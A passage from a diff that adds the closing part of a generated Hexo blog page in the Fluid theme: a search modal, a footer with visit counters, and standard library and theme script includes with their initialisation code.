+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
